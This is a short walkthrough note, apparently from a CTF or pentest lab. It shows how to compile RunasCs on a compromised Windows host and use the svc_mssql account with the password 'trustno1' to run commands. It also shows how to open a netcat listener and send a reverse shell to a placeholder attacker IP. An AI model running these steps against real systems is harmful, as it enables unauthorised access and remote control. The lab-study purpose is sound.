_RunasCs_ is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.

More info: https://github.com/antonioCoco/RunasCs/blob/master/README.md.

## Uploading and Compiling

Steps:

1. Download to your ATTACKING MACHINE, the *RunasCs.c*s file from Github.
2. Using the same method as earlier [[2. File Upload Enumeration & Obstacles]], upload the file.
3. On the shell you already have run the following:
	```shell
	RunasCs.exe svc_mssql trustno1 "cmd /c whoami /all"
	```

4. Compile the file:
	```shell
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
	```

5. Test the utilityi.
	```shell
	RunasCs.exe svc_mssql trustno1 "cmd /c whoami /all"
	```

## Getting a revershell

1. On the ATTACKING MACHINE open a netcat listener.
	```shell
	nc -lnvp 4444
	```

2. On the shell run:
```shell
RunasCs.exe svc_mssql trustno1 cmd.exe -r <ATTACKING MACHINE IP>:4444
```

Now, you have a shell.

If you look at the *svc_mssql* 's privileges you can see *SeManageVolumePrivilege       Perform volume maintenance tasks Disabled* is disabled.
